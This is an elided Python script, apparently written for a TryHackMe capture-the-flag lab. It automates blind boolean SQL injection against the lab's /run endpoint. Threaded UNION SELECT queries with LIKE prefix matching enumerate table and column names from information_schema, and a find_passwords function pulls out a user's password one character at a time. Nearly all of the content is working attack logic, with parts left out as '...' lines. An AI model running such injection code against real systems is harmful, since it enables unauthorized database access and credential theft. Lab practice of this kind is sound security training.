...
url = 'https://10-10-244-34.p.thmlabs.com/run'
...
headers = {
    ...
    'Accept': '*/*',
    'Origin': 'https://10-10-244-34.p.thmlabs.com/',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://10-10-244-34.p.thmlabs.com/level3',
    ...
    while True:  # Loop until no more table names are found
        ...
        with ThreadPoolExecutor(max_workers=15) as executor:  # Create a thread pool with 15 worker threads
            ...
            futures = {
                ...
                ): c for c in possible_chars if (table_name + c)[:3] not in searched_prefixes
            }
    ...
    while True:  # Loop until no more column names are found
        ...
        with ThreadPoolExecutor(max_workers=15) as executor:  # Create a thread pool with 15 worker threads
            ...
            futures = {
                executor.submit(
                    is_true_response,
                    f"select * from users where username = '{initial_username}' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='{db_name}' AND TABLE_NAME='{table_name}' AND COLUMN_NAME LIKE '{column_name + c}%' AND COLUMN_NAME NOT IN ({','.join(repr(col) for col in columns)});-- LIMIT 1"
...
def find_passwords(table_name, username):
    ...
    while True:
        found = False
        with ThreadPoolExecutor(max_workers=15) as executor:
            futures = {executor.submit(is_true_response, f"select * from users where username = '{initial_username}' UNION SELECT 1,2,3 FROM {table_name} WHERE username='{username}' AND password LIKE '{password + c}%';-- LIMIT 1"): c for c in possible_chars if password + c not in passwords}
            for future in as_completed(futures):
                c = futures[future]
                if future.result():
                    password += c
